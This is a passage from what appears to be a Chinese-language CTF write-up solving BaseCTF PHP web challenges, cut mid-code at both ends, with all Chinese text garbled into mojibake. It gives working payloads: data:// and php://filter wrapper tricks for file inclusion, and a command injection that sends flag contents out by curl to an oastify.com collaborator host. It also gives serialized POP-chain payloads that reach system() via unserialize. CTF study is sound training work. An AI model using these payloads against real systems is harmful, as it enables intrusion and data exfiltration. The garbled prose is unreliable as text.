class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ëøô‰∏çÊòØ Aura ÁöÑÂçöÂÆ¢ÔºÅ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Â∑≤ÁªèÊî∂Âà∞KengwangÁöÑÁ§ºÁâ©Âï¶'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ËØ∑ÂéªÂçöÂÆ¢ÈáåÈù¢ÂÜô‰∏ãÊÑüÊÉ≥Âì¶~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// ÂòøÂòøÔºåÊé•‰∏ãÊù•Ë¶ÅÊãÜÂºÄÁ§ºÁâ©Âï¶ÔºåÊÇÑÊÇÑÂëäËØâ‰Ω†ÔºåÁ§ºÁâ©Âú® flag.php ÈáåÈù¢Âì¶~ </span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p><strong>file_get_contents()</strong></p><p>ËØ≠Ê≥ïÔºöfile_get_contents(path,include_path,context,start,max_length)</p><p>ËØ•ÂáΩÊï∞ÊòØÁî®‰∫éÊääÊñá‰ª∂ÁöÑÂÜÖÂÆπËØªÂÖ•Âà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÈáåÁöÑÊñπÊ≥ï„ÄÇ</p><p>Ëøô‰∏™ÂáΩÊï∞ÁªïËøáÊñπÂºèÊúâÂ§öÁßçÔºö</p><p><strong>php:&#x2F;&#x2F;input‰º™ÂçèËÆÆÁªïËøá</strong></p><ol><li>Â∞ÜË¶ÅGETÁöÑÂèÇÊï∞?xxx&#x3D;php:&#x2F;&#x2F;input</li><li>Áî®postÊñπÊ≥ï‰º†ÂÖ•ÊÉ≥Ë¶Åfile_get_contents()ÂáΩÊï∞ËøîÂõûÁöÑÂÄº</li></ol><p><strong>data:&#x2F;&#x2F;‰º™ÂçèËÆÆÁªïËøá</strong></p><ol><li>?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ÊÉ≥Ë¶Åfile_get_contents()ÂáΩÊï∞ËøîÂõûÁöÑÂÄºÁöÑbase64ÁºñÁ†Å</li><li>?xxx&#x3D;data:text&#x2F;plain,(urlÁºñÁ†ÅÁöÑÂÜÖÂÆπ)</li></ol><p>ËøôÈáåÂõ†‰∏∫ÊòØPOST‰º†ÂèÇÊâÄ‰ª•ÈááÁî®data</p><p>strposÂáΩÊï∞ÊòØËøîÂõûÈúÄË¶ÅÊü•ÊâæÁöÑÂ≠óÁ¨¶‰∏≤Âú®ÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ÁöÑ‰ΩçÁΩÆÔºåËøôÈáåË¶ÅÊ±Ç‰∏∫0ÔºåÊÑèÂë≥ÁùÄÂøÖÈ°ªÂú®ÂºÄÂ§¥Âá∫Áé∞</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io</span></code></pre><p>Á¨¨‰∏â‰∏™ÁªïËøáÈúÄË¶ÅÁî®<code>file_get_contents</code>‰º†ÂÖ•<code>challenge</code>ÂèòÈáèÔºåËøôÈáåËÄÉÁÇπ‰∏∫<code>file_get_contents</code>Êú¨Êù•ÁöÑÁî®Ê≥ïÔºå‰ª•ÂèäurlË∑≥ËΩ¨</p><p>Êú¨È°µÈù¢Â∞±Êúâ<strong>Â∑≤ÁªèÊî∂Âà∞KengwangÁöÑÁ§ºÁâ©Âï¶</strong>ÁöÑÂ≠óÊ†∑</p><p>ÊâÄ‰ª•‰º†ÂÖ•<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657/</code>Âç≥ÂèØÁªïËøá</p><p>ÊúÄÂêéÂ∞±ÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊñá‰ª∂ÂåÖÂê´</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span></code></pre><h4 id="‰Ω†Âê¨‰∏çÂà∞ÊàëÁöÑÂ£∞Èü≥"><a href="#‰Ω†Âê¨‰∏çÂà∞ÊàëÁöÑÂ£∞Èü≥" class="headerlink" title="‰Ω†Âê¨‰∏çÂà∞ÊàëÁöÑÂ£∞Èü≥"></a>‰Ω†Âê¨‰∏çÂà∞ÊàëÁöÑÂ£∞Èü≥</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>Ê≤°ÂõûÊòæÔºåÊú¨Êù•ÊÉ≥ÂèçÂºπshellÔºåÊ≤°ÊàêÂäüÔºåÁõ¥Êé•Áî®bpÁöÑCollaboratorÂ§ñÂ∏¶Âá∫Êù•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>cmd<span class="token operator">=</span>curl<span class="token operator">%</span><span class="token number">2017698</span>qgbtquwasnhu67e3mej1a71vsjh<span class="token operator">.</span>oastify<span class="token operator">.</span>com<span class="token operator">/</span><span class="token string backtick-quoted-string">`tac%20/flag`</span></code></pre><p><img src="shell_exec.png" loading="lazy"></p><h4 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"‰ªÄ‰πàÔºå‰Ω†Á´üÊï¢‰∏çËÆ§ÂèØ?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>PopÈìæÂ¶Ç‰∏ã</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ser<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>web<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>kw<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>re<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>chu0<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>pwn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>dusk<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>over<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Misc<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>nothing<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>flag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>PopÈìæÔºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$word</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac\$&#123;IFS&#125;/flag');"</span><span class="token punctuation">;</span><span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"word"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Shark%00word"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ‰∏çË¶ÅÂøòËÆ∞‰øÆÊîπÂâçÈù¢ÁöÑÊï∞Â≠ó</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Sink%00cmd"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>nature<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Nature<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>animal<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Shark<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Shark<span class="token operator">%</span><span class="token number">00</span>word<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sink<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>tac<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>BIFS<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÂõ†‰∏∫Shark‰∏≠ÁöÑwordÂíåSinkÁöÑcmd‰∏∫ÁßÅÊúâÂèòÈáèÔºåÊâÄ‰ª•Ë¶ÅÊâãÂä®ÊîπÂèòÂÖ∂urlÁºñÁ†ÅÂêéÁöÑÁªìÊûú</p><pre class="language-php" data-language="php"><code class="language-php">cmd <span class="token operator">--</span><span class="token operator">></span> <span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd  s<span class="token punctuation">:</span><span class="token number">3</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">s</span><span class="token punctuation">:</span><span class="token number">9</span></code></pre><h4 id="Êï∞Â≠¶Â§ßÂ∏à"><a href="#Êï∞Â≠¶Â§ßÂ∏à" class="headerlink" title="Êï∞Â≠¶Â§ßÂ∏à"></a>Êï∞Â≠¶Â§ßÂ∏à</h4><p>ËÑöÊú¨È¢òÔºåÊ≥®ÊÑèÈô§Ê≥ïÂèñÊï¥ËÄå‰∏îË¶ÅÊõøÊç¢‰∏Ä‰∏ã‰πòÂè∑ÂíåÈô§Âè∑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token 